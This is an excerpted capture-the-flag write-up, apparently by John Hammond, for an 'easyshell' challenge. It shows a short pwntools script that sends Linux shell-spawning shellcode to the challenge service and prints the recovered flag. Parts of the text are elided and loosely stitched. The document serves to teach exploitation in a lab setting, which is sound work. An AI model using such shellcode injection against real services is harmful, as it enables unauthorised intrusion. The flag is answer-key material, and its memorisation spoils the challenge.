...
> John Hammond | Tuesday, February 14th, 2017
...
This challenge also offers a [ZIP file](easyshell.zip) to download, which includes the source code for the challenge.
...
So it looks like the challenge is just asking for [shellcode] that it will run for us. This isn't too hard to do with the [`shellcraft`][shellcraft] modules from  [`pwntools`][pwntools]. 
...
# -*- coding: utf-8 -*-
# @Author: john
# @Date:   2017-02-11 21:39:48
# @Last Modified by:   john
# @Last Modified time: 2017-02-11 21:43:45
...
print s.recv()
s.sendline( asm(shellcraft.i386.linux.sh() ))
s.interactive()
...
It just connects to the service, sends it shellcode, and goes interactive so we can [`cat`][cat] the flag.


__The flag was: `FLAG:c832b461f8772b49f45e6c3906645adb`__
...
[UNION SELECT]: http://www.w3schools.com/sql/sql_union.asp
...
[shellcraft]: https://docs.pwntools.com/en/3.0.1/shellcraft.html